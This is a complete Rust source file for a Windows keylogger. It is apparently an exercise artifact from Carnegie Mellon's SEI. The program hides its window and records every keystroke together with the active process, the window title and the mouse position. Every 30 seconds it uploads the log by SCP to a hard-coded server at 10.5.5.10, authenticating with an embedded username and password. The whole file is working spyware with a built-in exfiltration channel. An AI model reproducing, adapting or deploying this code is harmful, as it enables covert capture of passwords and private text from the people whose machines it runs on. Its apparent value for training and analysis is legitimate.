
// Copyright 2022 Carnegie Mellon University.
// Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
// root or contact permission@sei.cmu.edu for full terms.

#![windows_subsystem = "windows"]

#[cfg(windows)]
extern crate winapi;

use std::thread;
use std::time::Duration;
use std::sync::mpsc::{channel, Sender, Receiver};
use std::net::{TcpStream, SocketAddr};
use std::io::Write;
use std::error::Error;
use std::str::FromStr;
use std::path::Path;

use chrono::{DateTime, Timelike, Utc};

use ssh2::Session;

const DEFAULT_SERVER: &str = "10.5.5.10:22";
const USERNAME: &str = "loggeruser";
const PASSWORD: &str = "ugiefkeys";
/*
#[cfg(feature = "variant_1")]
const PASSWORD: &str = "e9e39dca4dafc7ce";
#[cfg(feature = "variant_2")]
const PASSWORD: &str = "4c03c8eed209dfdf";
#[cfg(feature = "variant_3")]
const PASSWORD: &str = "6ee945b587b0faae";
#[cfg(feature = "variant_4")]
const PASSWORD: &str = "2992d2a6ee37940f";
 */
const REMOTE_FILE_NAME: &str = "keys";

const VKEY_LOOKUP: [&str; 256] = [
    "CODE_0x0",
    "VK_LBUTTON",
    "VK_RBUTTON",
    "VK_CANCEL",
    "VK_MBUTTON",
    "VK_XBUTTON1",
    "VK_XBUTTON2",
    "CODE_0x7",
    "VK_BACK",
    "VK_TAB",
    "CODE_0xA",
    "CODE_0xB",
    "VK_CLEAR",
    "VK_RETURN",
    "CODE_0xE",
    "CODE_0xF",
    "VK_SHIFT",
    "VK_CONTROL",
    "VK_MENU",
    "VK_PAUSE",
    "VK_CAPITAL",
    "VK_HANGUL",
    "CODE_0x16",
    "VK_JUNJA",
    "VK_FINAL",
    "VK_KANJI",
    "CODE_0x1A",
    "VK_ESCAPE",
    "VK_CONVERT",
    "VK_NONCONVERT",
    "VK_ACCEPT",
    "VK_MODECHANGE",
    "VK_SPACE",
    "VK_PRIOR",
    "VK_NEXT",
    "VK_END",
    "VK_HOME",
    "VK_LEFT",
    "VK_UP",
    "VK_RIGHT",
    "VK_DOWN",
    "VK_SELECT",
    "VK_PRINT",
    "VK_EXECUTE",
    "VK_SNAPSHOT",
    "VK_INSERT",
    "VK_DELETE",
    "VK_HELP",
    "0",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "CODE_0x3A",
    "CODE_0x3B",
    "CODE_0x3C",
    "CODE_0x3D",
    "CODE_0x3E",
    "CODE_0x3F",
    "CODE_0x40",
    "A",
    "B",
    "C",
    "D",
    "E",
    "F",
    "G",
    "H",
    "I",
    "J",
    "K",
    "L",
    "M",
    "N",
    "O",
    "P",
    "Q",
    "R",
    "S",
    "T",
    "U",
    "V",
    "W",
    "X",
    "Y",
    "Z",
    "VK_LWIN",
    "VK_RWIN",
    "VK_APPS",
    "CODE_0x5E",
    "VK_SLEEP",
    "VK_NUMPAD0",
    "VK_NUMPAD1",
    "VK_NUMPAD2",
    "VK_NUMPAD3",
    "VK_NUMPAD4",
    "VK_NUMPAD5",
    "VK_NUMPAD6",
    "VK_NUMPAD7",
    "VK_NUMPAD8",
    "VK_NUMPAD9",
    "VK_MULTIPLY",
    "VK_ADD",
    "VK_SEPARATOR",
    "VK_SUBTRACT",
    "VK_DECIMAL",
    "VK_DIVIDE",
    "VK_F1",
    "VK_F2",
    "VK_F3",
    "VK_F4",
    "VK_F5",
    "VK_F6",
    "VK_F7",
    "VK_F8",
    "VK_F9",
    "VK_F10",
    "VK_F11",
    "VK_F12",
    "VK_F13",
    "VK_F14",
    "VK_F15",
    "VK_F16",
    "VK_F17",
    "VK_F18",
    "VK_F19",
    "VK_F20",
    "VK_F21",
    "VK_F22",
    "VK_F23",
    "VK_F24",
    "CODE_0x88",
    "CODE_0x89",
    "CODE_0x8A",
    "CODE_0x8B",
    "CODE_0x8C",
    "CODE_0x8D",
    "CODE_0x8E",
    "CODE_0x8F",
    "VK_NUMLOCK",
    "VK_SCROLL",
    "CODE_0x92",
    "CODE_0x93",
    "CODE_0x94",
    "CODE_0x95",
    "CODE_0x96",
    "CODE_0x97",
    "CODE_0x98",
    "CODE_0x99",
    "CODE_0x9A",
    "CODE_0x9B",
    "CODE_0x9C",
    "CODE_0x9D",
    "CODE_0x9E",
    "CODE_0x9F",
    "VK_LSHIFT",
    "VK_RSHIFT",
    "VK_LCONTROL",
    "VK_RCONTROL",
    "VK_LMENU",
    "VK_RMENU",
    "VK_BROWSER_BACK",
    "VK_BROWSER_FORWARD",
    "VK_BROWSER_REFRESH",
    "VK_BROWSER_STOP",
    "VK_BROWSER_SEARCH",
    "VK_BROWSER_FAVORITES",
    "VK_BROWSER_HOME",
    "VK_VOLUME_MUTE",
    "VK_VOLUME_DOWN",
    "VK_VOLUME_UP",
    "VK_MEDIA_NEXT_TRACK",
    "VK_MEDIA_PREV_TRACK",
    "VK_MEDIA_STOP",
    "VK_MEDIA_PLAY_PAUSE",
    "VK_LAUNCH_MAIL",
    "VK_LAUNCH_MEDIA_SELECT",
    "VK_LAUNCH_APP1",
    "VK_LAUNCH_APP2",
    "CODE_0xB8",
    "CODE_0xB9",
    "VK_OEM_1",
    "VK_OEM_PLUS",
    "VK_OEM_COMMA",
    "VK_OEM_MINUS",
    "VK_OEM_PERIOD",
    "VK_OEM_2",
    "VK_OEM_3",
    "CODE_0xC1",
    "CODE_0xC2",
    "CODE_0xC3",
    "CODE_0xC4",
    "CODE_0xC5",
    "CODE_0xC6",
    "CODE_0xC7",
    "CODE_0xC8",
    "CODE_0xC9",
    "CODE_0xCA",
    "CODE_0xCB",
    "CODE_0xCC",
    "CODE_0xCD",
    "CODE_0xCE",
    "CODE_0xCF",
    "CODE_0xD0",
    "CODE_0xD1",
    "CODE_0xD2",
    "CODE_0xD3",
    "CODE_0xD4",
    "CODE_0xD5",
    "CODE_0xD6",
    "CODE_0xD7",
    "CODE_0xD8",
    "CODE_0xD9",
    "CODE_0xDA",
    "VK_OEM_4",
    "VK_OEM_5",
    "VK_OEM_6",
    "VK_OEM_7",
    "VK_OEM_8",
    "CODE_0xE0",
    "CODE_0xE1",
    "VK_OEM_102",
    "CODE_0xE3",
    "CODE_0xE4",
    "VK_PROCESSKEY",
    "CODE_0xE6",
    "CODE_0xE7",
    "CODE_0xE8",
    "CODE_0xE9",
    "CODE_0xEA",
    "CODE_0xEB",
    "CODE_0xEC",
    "CODE_0xED",
    "CODE_0xEE",
    "CODE_0xEF",
    "CODE_0xF0",
    "CODE_0xF1",
    "CODE_0xF2",
    "CODE_0xF3",
    "CODE_0xF4",
    "CODE_0xF5",
    "VK_ATTN",
    "VK_CRSEL",
    "VK_EXSEL",
    "VK_EREOF",
    "VK_PLAY",
    "VK_ZOOM",
    "VK_NONAME",
    "VK_PA1",
    "VK_OEM_CLEAR",
    "CODE_0xFF",
];

#[cfg(windows)]
fn run(sender: Sender<String>) {
    use winapi::um::winuser::*;
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::psapi::GetProcessImageFileNameW;
    use winapi::um::winnls::GetUserDefaultLocaleName;
    use winapi::shared::minwindef::DWORD;
    use winapi::ctypes::c_int;

    let locale = unsafe {
        const LEN: i32 = 85;//from https://docs.microsoft.com/de-de/windows/desktop/Intl/locale-name-constants
        let mut buf = vec![0 as u16; LEN as usize];
        GetUserDefaultLocaleName(buf.as_mut_ptr(), LEN);

        //find the null terminator
        let mut len = 0;
        buf.iter().enumerate().for_each(|(i, c)| {
            if *c == 0 && len == 0 {
                len = i;
            }
        });

        String::from_utf16_lossy(buf[0..len].as_mut())
    };

    if let Err(e) = sender.send(locale) {
        println!("{}", e);
    }

    loop {
        thread::sleep(Duration::from_millis(10));

        let hwnd = unsafe { GetForegroundWindow() };

        let pid = unsafe {
            let mut p = 0 as DWORD;
            GetWindowThreadProcessId(hwnd, &mut p);
            p
        };

        let handle = unsafe {
            OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
        };

        let filename = unsafe {
            const LEN: u32 = 256;
            let mut buf = vec![0 as u16; LEN as usize];
            GetProcessImageFileNameW(handle, buf.as_mut_ptr(), LEN);

            //find the null terminator
            let mut len = 0;
            buf.iter().enumerate().for_each(|(i, c)| {
                if *c == 0 && len == 0 {
                    len = i;
                }
            });

            String::from_utf16_lossy(buf[0..len].as_mut())
        };

        let title = unsafe {
            let len = GetWindowTextLengthW(hwnd) + 1;
            let mut t = String::from("__NO_TITLE__");

            if len > 0 {
                let mut buf = vec![0 as u16; len as usize];
                GetWindowTextW(hwnd, buf.as_mut_ptr(), len as i32);
                buf.remove(buf.len() - 1);
                t = String::from_utf16_lossy(buf.as_mut());
            }

            t
        };

        let now: DateTime<Utc> = Utc::now();

        for i in 0 as c_int..255 as c_int {
            let key = unsafe { GetAsyncKeyState(i) };

            if (key & 1) > 0 {
                let s = format!("[{:02}:{:02}:{:02}][{}][{}][{}]\n",
                                now.hour(), now.minute(), now.second(),
                                filename.trim(), title.trim(), keycode_to_string(i as u8));

                if let Err(e) = sender.send(s) {
                    println!("{}", e);
                }
            }
        }
    }
}

fn keycode_to_string(k: u8) -> String {
    match k {
        1 | 2 | 4 | 5 | 6 => format!("{}:{}", VKEY_LOOKUP[k as usize].to_string(), get_mouse_pos()),
        _ => VKEY_LOOKUP[k as usize].to_string()
    }
}

fn get_mouse_pos() -> String {
    use winapi::um::winuser::*;
    use winapi::shared::windef::POINT;

    let pos = unsafe {
        let mut p = POINT { x: -1, y: -1 };
        GetCursorPos(&mut p);
        p
    };

    format!("{},{}", pos.x, pos.y)
}

fn transmit_keys(messages: Vec<String>) -> Result<(), Box<dyn Error>> {
    let socket_addr = SocketAddr::from_str(DEFAULT_SERVER)?;
    let stream = TcpStream::connect_timeout(&socket_addr, Duration::from_secs(1))?;
    stream.set_write_timeout(Some(Duration::from_secs(1)))?;

    let mut ssh_session = Session::new()?;
    ssh_session.set_tcp_stream(stream);
    ssh_session.handshake()?;
    ssh_session.userauth_password(USERNAME, PASSWORD)?;

    let joined_messages = messages.join("\n");
    let out_buf = joined_messages.as_bytes();
    let mut remote_file = ssh_session.scp_send(Path::new(REMOTE_FILE_NAME), 0o644, out_buf.len() as u64, None)?;
    remote_file.write(out_buf)?;
    remote_file.send_eof()?;
    remote_file.wait_eof()?;
    remote_file.close()?;
    remote_file.wait_close()?;

    ssh_session.disconnect(None, "", None)?;
    Ok(())
}

fn send_thread(receiver: Receiver<String>) {
    loop {
        thread::sleep(Duration::from_millis(30000));

        let sequence = receiver.try_iter().collect();
        if let Err(e) = transmit_keys(sequence) {
            println!("{}", e);
        } else {
            dbg!("Pushed remote file");
        }
    }
}

fn main() {
    let (sender, receiver) = channel();

    thread::spawn(move || {
        send_thread(receiver);
    });

    run(sender);
}


